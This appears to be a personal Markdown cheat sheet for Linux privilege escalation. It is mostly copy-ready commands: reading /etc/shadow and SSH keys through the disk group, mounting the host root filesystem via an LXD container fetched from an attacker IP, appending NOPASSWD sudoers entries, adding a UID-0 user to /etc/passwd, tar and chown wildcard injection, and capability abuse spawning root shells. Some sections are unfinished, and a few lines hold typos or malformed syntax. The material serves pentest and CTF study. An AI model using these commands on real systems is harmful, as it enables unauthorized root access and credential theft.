### System Information

##### Distribution 

```bash
cat /etc/issue # Text file which contains a message or system identification to be printed before the login prompt.
cat /etc/*-release
cat /etc/lsb-release # Contain the LSB_VERSION field. 
# The value of the field should be a colon separated list of supported module
# versions indicating the LSB specification modules to which the installation is compliant. 

cat /etc/redhat-release
lsb_release -all # Prints certain LSB (Linux Standard Base) and Distribution information
```

##### Kernel Version

```bash
at /proc/version # This file specifies the version of the Linux kernel, the version of gcc used to compile the kernel, and the time of kernel compilation.
uname -a # Print all system information
uname -mrs # Print the machine hardware name *m*, kernel release *r* and the kernel-name *s*
rpm -q kernel # Print the kernel version using the RPM Package Manager
dmesg | grep Linux # Print or control the kernel ring buffer
ls /boot | grep vmlinuz- # Grep the name the Linux kernel executable within the boot partition
```

###### Others

```bash
# Print environment variables
printenv 
# Search for drives
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```

###### *If you don't know, now you know: **([fstab](https://man7.org/linux/man-pages/man5/fstab.5.html)/[mtab](https://www.unix.com/man-page/v7/5/mtab/))**
The fstab file contains descriptive information about the filesystems the system can mount. 
Those filesystems should be mounted at boot time. 

The mtab file is about the *currently* mounted. 

You could find some credentials, for instance when there is a CIFS Windows Share mounted.

### Getting /bin/sh

#### Quick test

```bash
# It may be allowed to simply run it
/bin/sh
# Adding /bin/sh to PATH and/or SHELL
export PATH=/bin:/usr/bin:/sbin:$PATH
export SHELL=/bin/sh
# Using chsh (Command used to change your login shell.)
chsh
/bin/bash
# Allow to copy from /bin
cp /bin/sh /current/directory; sh
```

### Users

#### User Enumeration

```bash
lastlog # Reports the most recent login of all users
```

#### Group Membership Privigele Escalation

```bash
id # Print real and effective user and group IDs
```

##### Shadow

The users of the group shadow group can read the content of /etc/shadow and /etc/gshadow, containing the hashes of the passwords of other users and groups.

##### Kmem

The group kmem is able to read the content of the system memory, potentially disclosing data belonging to other processes.

##### Disk

The group **disk** can be very dangerous, since hard drives in /dev/sd* and /dev/hd* can be read and written bypassing any file system and any partition, allowing a normal user to disclose, alter and destroy both the partitions and the data of such drives without root privileges. Users should never belong to this group.

You can find use that vulnerability as showed below where we use a filesystem debugger to get SSH keys and the /etc/shadow content.

```bash
debugfs /dev/sda1 # Starts debugging /dev/sda1
debugfs: cd /root # Move to /root
debugfs: ls # List all files in directory
debugfs: cat /root/.ssh/id_rsa # Display SSH Keys
debugfs: cat /etc/shadow # Display username and password
```

##### Video Group

This group can be used locally to give a set of users access to a video device (like the framebuffer, the videocard or a webcam).

Application software that uses the frame buffer device (e.g. the X server) will use /dev/fb0 by default (older software uses /dev/fb0current).

Yo can then use Gimp to see the content.

```bash
w # Show who is logged on and what they are doing.
cat /dev/fb0 > /screenshot.raw # Copy the content from the first frame buffer towards screenshot.raw
cat /sys/class/graphics/fb0/virtual_size # Find the resolution of the screen
```

Then open screenshot.raw with Gimp and specify the Width and Height

https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe#video-group

##### ADM Group

This group allows you to view logs in /var/log.

##### Wheel Group

> / / / To Finish / / / 

Any user that belongs to the group wheel can execute anything as sudo

/etc/sudoers

```bash
sudo su
```

##### LXD & LXC

**Linux Container (LXC)** are often considered as a lightweight virtualization technology that is something in the middle between a chroot and a completely developed virtual machine.
It creates an environment as close as possible to a Linux installation but without the need for a separate kernel.
**Linux daemon (LXD)** is the lightervisor, or lightweight container hypervisor. LXD is building on top of a container technology called LXC which was used by Docker before. It uses the stable LXC API to do all the container management behind the scene, adding the REST API on top and providing a much simpler, more consistent user experience.

When you are part of the LXD group, you can initialize the LXD process

```bash
lxd init # Initialize the LXD the process
# !!! When the "Do you want to configure a new storage pool?" appears, enter yes
# On your own machine get distrobuilder which is a system container image builder for LXC and LXD
sudo apt install -y golang-go debootstrap rsync gpg squashfs-tools # Install the requirements on your own machine
go get -d -v github.com/lxc/distrobuilder # Clone distrobuilder repo
cd $HOME/go/src/github.com/lxc/distrobuilder # Get to the make folder for distrobuilder
make # Make it
# Prepare the creation of alpine (still on your own computer)
mkdir -p $HOME/ContainerImages/alpine/
cd $HOME/ContainerImages/alpine/
wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml
sudo $HOME/go/bin/distrobuilder build-lxd alpine.yaml # Create the LXD container using distrobuilder
# You will have then a lxd.tar.xz file and a rootfs.squashfs file
# Upload them to the victim host
wget http://IP:PORT/lxd.tar.xz
wget http://IP:PORT/rootfs.squashfs
lxc image import lxd.tar.xz rootfs.squashfs --alias alpine # Import an image using the META file (lxd.tar.xz) and ROOTFS file (rootfs.squashfs)
lxc init alpine thomasd -c security.privileged=true # Create a container called thomasd from images alpline and give a configuration parameter to run the instance in privileged mode
lxc list # Verify that the container thomasd exist
lxc config device add thomasd host-root disk source=/ path=/mnt/root recursive=true # Add an extra device which mount "/" within the instance to the "thomasd" container  
lxc start thomasd # Run the container thomasd
lxc exec thomasd /bin/sh
#[System]:~# cd /mnt/root #Here is where the filesystem is mounted

```

#### SUID & SGID

```bash
curl https://github.com/GTFOBins/GTFOBins.github.io/tree/master/_gtfobins 2>/dev/null | grep 'href="/GTFOBins/' | grep '.md">' | awk -F 'title="' '{print $2}' | cut -d '"' -f1 | cut -d "." -f1 | sed  -e 's,^,|,' | tr '\n' ' ' | tr -d "[:blank:]" #  GTFOBins.txt 
```

```bash
find / -perm -u=s -type f -print 2>/dev/null # Search for program with the SUID
find / -perm -g=s -type f -print 2>/dev/null | sed 's:.*/::'  # Search for program with the SGID
```

###### *If you don't know, now you know: [SUID & SGID]()*

- **SUID** (**S**et owner **U**ser **ID** up on execution) is defined as giving temporary permissions to a user to run a program/file with the permissions of the file owner rather that the user who runs
- **SGID** (**S**et owner **G**roup **ID** up on execution) same as SUID for groups.


#### Sudoers

The file /etc/sudoers and the files inside /etc/sudoers.d configure who can use sudo and how. 

```bash
sudo -l # Check if they are scripts than once launch, they are run as root
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
```

###### *If you don't know, now you know: [Sudoers](https://help.ubuntu.com/community/Sudoers)*

The /etc/sudoers file controls who can run what commands as what users on what machines and can also control special things such as whether you need a password for particular commands.

You can use **PASSWD** and **NOPASSWD** to specify whether the user has to enter a password or not

#### Files Enumeration 

##### Interesting Files

```bash
ls -la ~/.*_history # 
ls -la /root/.*_history #
find / -name *.bak -print 2>/dev/null # Commonly used to signify a backup copy of a file  
find / -name .htpasswd -print 2>/dev/null
find / -name id_rsa -print 2>/dev/null
find / -name authorized_keys -print 2> /dev/null
cat /etc/security/opasswd 
strings /dev/mem -n10 | grep -i PASS # Search for password in memory
locate password | more
```

- **.htpasswd**: used when protecting a file, folder or entire website with a password using HTTP authentication and implemented using rules within a .htaccess file.
  - **\$1$**: MD5crypt -> Mode 500
  - **\$apr1$**: md5apr1 -> Mode 1600
- **id_rsa**: SSH Private key.
  ```bash
  ssh -i id_rsa user@IP
  ./sshng2joh.py id_rsa 
  john --worldlist/rockyou.txt *file.john*
  ```
- **authorized_keys**
  OpenSSL 0.9.8c-1 up to versions before 0.9.8g-9 on Debian-based operating systems uses a random number generator that generates predictable numbers, which makes it easier for remote attackers to conduct brute force guessing attacks against cryptographic keys.
  https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md#ssh-key-predictable-prng-authorized_keys-process

- **/etc/security/opasswd**: File with password history (pam_pwhistory)

##### All Files/Folder

```bash
find . -type d -perm -g=x 2>/dev/null
find . -perm -u=x 2>/dev/null
find / -writable ! -user `whoami` -type f ! -path "/proc/*" ! -path "/sys/*" -exec ls -al {} \; 2>/dev/null # Writable files
```

Interesting files:
- /etc/sysconfig/network-scripts/ifcfg-xxx (Centos/Redhat): 
  [source](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- /etc/passwd 
  ```bash
  # First generate a password with one of the following commands.
  openssl passwd -1 -salt hacker hacker
  mkpasswd -m SHA-512 hacker
  python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
  # Then add the user hacker and add the generated password.
  hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
  ```

### Timers

> / / / To Finish / / / 

Timers are systemd unit files whose name ends in . timer that control . service files or events. Timers can be used as an alternative to cron.

```bash
systemctl list-timers --all
```

### Cron Jobs

Since Cron runs as root when executing /etc/crontab, any commands or scripts that are called by the crontab will also run as root. 

```bash
crontab -l # Display all user's jobs in cron / crontab
crontab -e # Edit the current crontab using the  editor specified by the VISUAL or EDITOR environment variables.
```
Interesting cron files: 
- **/etc/crontab**: System crontab. Cron will run as the **root** user when executing scripts and commands in this file.
- **/etc/anacrontab**: Cron will run as the **root** user when executing scripts and commands in this file.
*Nowadays the file is empty by default.
Originally it was usually used to run daily, weekly, monthly jobs. By default these jobs are now run through anacron which reads /etc/anacrontab configuration file.*
- **/var/spool/cron**: Directory that contains user crontables created by the crontab command.
- **/etc/cron.d:**: Directory that contains system cronjobs stored for different users.

Cron examines all stored crontabs and checks each job to see if it needs to be run in the current minute.

1. Search if there are script executed that you can write
2. Search for wildcard injection vulnerability such as tar, chown and chmod (cc Wildcard)
   
##### $PATH
```bash
echo $PATH
```
If you notice '.' in environment PATH variable it means that the logged user can execute binaries/scripts from the current directory and it can be an excellent technique for an attacker to escalate root privilege.

###### *If you don't know, now you know: [PATH]()*

PATH is an environmental variable in Linux and Unix-like operating systems which specifies all bin and sbin directories that hold all executable programs are stored.
When the user run any command on the terminal, its request to the shell to search for executable files with the help of PATH Variable in response to commands executed by a user. 

### Wildcard

When you provide **--** followed by two spaces, it instructs the program to stop interpret command line argument

#### Chown/Chmod file reference 

Here we gonna use the **--reference=FILE** parameter that use the given *file*'s owner and group rather than specifying OWNER:GROUP values

```bash
touch -- --reference=.thomas.txt
chown -R * .txt # This wil
```

Here below is an example

```bash
# Create:
# - One file called ".thomas.txt" that belong to me
# - One filed called "--reference=.thomas.txt" which will be used as a reference parameter
kali@kali:/example$ touch .thomas.txt
kali@kali:/example$ touch -- --reference=.thomas.txt
# You can see that all files, except the two I created belongs to root
kali@kali:/example$ ls -all
total 44
drwxrwxrwx  2 root root  4096 Nov 20 11:41  .
drwxr-xr-x 22 root root 36864 Nov 20 11:31  ..
-rw-r--r--  1 root root     0 Nov 20 11:40  file1.txt
-rw-r--r--  1 root root     0 Nov 20 11:40  file2.txt
-rw-r--r--  1 root root     0 Nov 20 11:41  file3.txt
-rw-r--r--  1 kali kali     0 Nov 20 11:41 '--reference=.thomas.txt'
-rw-r--r--  1 kali kali     0 Nov 20 11:41  .thomas.txt
# Let's connect as root and decide that ALL files within the directory 
# should belong to the user and group root
root@kali:/example# chown -R root:root * 2>/dev/null
# And we can see that it took the "--reference=.thomas.txt" via the '*' and assigned all the files to the user kali
root@kali:/example# ls -all
total 44
drwxrwxrwx  2 root root  4096 Nov 20 11:41  .
drwxr-xr-x 22 root root 36864 Nov 20 11:31  ..
-rw-r--r--  1 kali kali     0 Nov 20 11:40  file1.txt
-rw-r--r--  1 kali kali     0 Nov 20 11:40  file2.txt
-rw-r--r--  1 kali kali     0 Nov 20 11:41  file3.txt
-rw-r--r--  1 kali kali     0 Nov 20 11:41 '--reference=.thomas.txt'
-rw-r--r--  1 kali kali     0 Nov 20 11:41  .thomas.txt
```

This works with chmod as well.

#### Tar arbitrary command execution

```bash
touch -- --checkpoint=1 # Create a file named --checkpoint=1
touch -- --checkpoint-action=exec=/bin/sh # Create a file named --checkpoint-action=exec=/bin/sh
--checkpoint=1 --checkpoint-action=action=exec=sh shell.sh # Perform shell.sh every file it go through
```

### Linux Processes

[pspy](https://github.com/DominicBreuker/pspy#how-it-works) is a command line tool designed to snoop on processes without need for root permissions. It allows you to see commands run by other users, cron jobs, etc. as they execute. 
It heavily uses the [inotify API](https://man7.org/linux/man-pages/man7/inotify.7.html) provides a mechanism for monitoring filesystem events.
Inotify can be used to monitor individual files, or to monitor directories.

```bash
pspy
ps -aef --forest
```

### Linux Capabilities 

The [getcap](https://www.man7.org/linux/man-pages/man8/getcap.8.html) command displays the name and capabilities of each specified file.
To recursively check the capabilities of all files you have access, use the following command **getcap -r / 2>/dev/null**
For instance, you can find Python or Perl that are assigned to root and you can do the following then:

```bash
./python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
./perl -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/bash";'
```

###### *If you don't know, now you know: [Capabilities](https://linux.die.net/man/7/capabilities)*

Starting with kernel 2.2, Linux divides the privileges traditionally associated with superuser into distinct units, known as *capabilities*, which can be independently enabled and disabled. Capabilities are a per-thread attribute.

Some capabilities to look for are:
- **CAP_CHOWN**: Make arbitrary changes to file UIDs and GIDs (SUIDs and SGIDs as well) 
- **CAP_DAC_OVERRID**: Bypass file read, write, and execute permission checks.
- **CAP_DAC_READ_SEARCH**: Bypass file read permission checks and directory read and execute permission checks
- **CAP_SETGID**: Make arbitrary manipulations of process GIDs and supplementary GID list
- **CAP_SETUID**: Make arbitrary manipulations of process UIDs
- **CAP_SYS_PTRACE**: Transfer data to or from the memory of arbitrary processes

### D-Bus Enumeration 

**D-Bus** is an IPC mechanism initially designed to replace the software component communications systems used by the GNOME and KDE Linux desktop environments

Each service is defined by the **objects** and **interfaces** that it exposes. We can think of objects as instances of classes in standard OOP languages.

```bash
busctl list # List D-Bus interfaces
busctl status INTERFACE
busctl tree INTERFACE # Get Interfaces of the service object
busctl introspect INTERFACE SERVICE_OBJECT # Get methods of the interface
```

### SNMP

> / / / To Finish / / / 

If you have a SNMP community with write permissions we can archive code execution by abusing the **NET-SNMP-EXTEND-MIB extension**

The Net-SNMP Agent provides an extension MIB (NET-SNMP-EXTEND-MIB) that can be used to query arbitrary shell scripts. To specify the shell script to run, use the extend directive in the /etc/snmp/snmpd.conf file. Once defined, the Agent will provide the exit code and any output of the command over SNMP.

https://mogwailabs.de/en/blog/2019/10/abusing-linux-snmp-for-rce/

snmp-shell 

### Shared library

A **shared library** or **shared object** is a file that is intended to be **shared** by executable files and further shared object files.

Linux shared libraries combined with weak file permissions can be used to execute arbitrary code and compromise Linux system.

Within Linux, here below is the order where the O.S. searches for librairies:

1. Any directories specified by rpath-link options (directories specified by rpath-link options are only effective at link time)
2. Any directories specified by –rpath options (directories specified by rpath options are included in the executable and used at runtime)
3. LD_RUN_PATH
4. LD_LIBRARY_PATH
5. Directories in the DT_RUNPATH or DT_RPATH. (DT_RPATH entries are ignored if DT_RUNPATH entries exist
6. /lib and /usr/lib
7. Directories within /etc/ld.so.conf

If we can replace a shared library with a malicious one, thenwhen the application runs, it will load the malicious code and run it with the executing owner’s permissions.

Here below is a nice diagram from [contextis.com](https://www.contextis.com/en/blog/linux-privilege-escalation-via-dynamically-linked-shared-object-library) which shows how to test that

![](Linux_Privilege_Escalation_via_Dynamically_Linked_Shared_Object_Library02.png)

```bash
# 1
ldd BINARY
# 2
objdump -x BINARY | grep RPATH 
# 3
echo $LD_LIBRARY_PATH
echo $LD_RUN_PATH
objdump -x BINARY | grep RUNPATH
ls
```
> / / / To Finish / / /  

http://osr507doc.sco.com/en/tools/ShLib_WhatIs.html#:~:text=A%20shared%20library%20is%20a,Instead%2C%20a%20special%20section%20called%20.

https://book.hacktricks.xyz/linux-unix/privilege-escalation/ld.so.conf-example
https://www.contextis.com/en/blog/linux-privilege-escalation-via-dynamically-linked-shared-object-library
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md#shared-library
https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/
https://touhidshaikh.com/blog/2018/04/12/sudo-ld_preload-linux-privilege-escalation/

LD_PRELOAD


#### References:

https://nxnjz.net/2018/08/an-interesting-privilege-escalation-vector-getcap/
https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/
- CAP_SYS_PTRACE: https://blog.pentesteracademy.com/privilege-escalation-by-abusing-sys-ptrace-linux-capability-f6e6ad2a59cc
- https://reboare.gitbooks.io/booj-security/content/general-linux/privilege-escalation.html